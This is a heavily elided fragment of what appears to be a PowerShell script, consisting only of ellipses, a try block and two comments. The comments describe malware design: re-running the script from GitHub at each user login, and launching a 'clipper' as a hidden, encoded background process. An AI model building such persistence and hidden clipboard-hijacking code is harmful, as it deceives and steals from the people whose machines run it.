...
try {
    ...
    # Ensures the script re-runs from GitHub every time the user logs in
...
'@
    ...
    # Launch clipper as a separate, hidden, encoded background process
